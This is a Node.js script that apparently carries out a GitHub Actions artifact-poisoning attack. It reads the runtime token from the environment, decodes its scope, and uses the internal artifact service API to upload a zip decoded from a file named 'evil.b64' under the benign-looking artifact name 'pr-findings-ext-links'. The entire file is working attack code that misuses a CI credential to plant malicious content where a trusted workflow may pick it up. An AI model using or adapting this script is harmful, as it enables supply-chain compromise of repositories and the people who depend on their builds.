const fs = require('fs');
const b64 = fs.readFileSync(__dirname + '/evil.b64', 'utf8').trim();
const zip = Buffer.from(b64, 'base64');
const token = process.env.ACTIONS_RUNTIME_TOKEN;
const base = (process.env.ACTIONS_RESULTS_URL || '').replace(/\/$/, '');
if (!token || !base) { console.log('missing runtime env'); process.exit(1); }
const scp = JSON.parse(Buffer.from(token.split('.')[1].replace(/-/g,'+').replace(/_/g,'/'), 'base64').toString()).scp;
const scope = scp.split(' ').find(s => s.startsWith('Actions.Results:'));
const [_, runBackend, jobBackend] = scope.split(':');
const name = 'pr-findings-ext-links';
async function twirp(method, body) {
  const r = await fetch(base + '/twirp/github.actions.results.api.v1.ArtifactService/' + method, {
    method: 'POST',
    headers: {'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token},
    body: JSON.stringify(body)
  });
  return await r.json();
}
(async () => {
  const c = await twirp('CreateArtifact', {workflow_run_backend_id: runBackend, workflow_job_run_backend_id: jobBackend, name, mime_type: {value: 'application/zip'}, version: 7});
  console.log('create:', JSON.stringify(c).slice(0, 300));
  const put = await fetch(c.signed_upload_url, {method: 'PUT', headers: {'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/zip', 'x-ms-blob-content-type': 'application/zip'}, body: zip});
  console.log('put status:', put.status);
  const hash = require('crypto').createHash('sha256').update(zip).digest('hex');
  const f = await twirp('FinalizeArtifact', {workflow_run_backend_id: runBackend, workflow_job_run_backend_id: jobBackend, name, size: String(zip.length), hash: {value: 'sha256:' + hash}});
  console.log('finalize:', JSON.stringify(f));
})().catch(e => { console.log('ERR ' + e.message); process.exit(1); });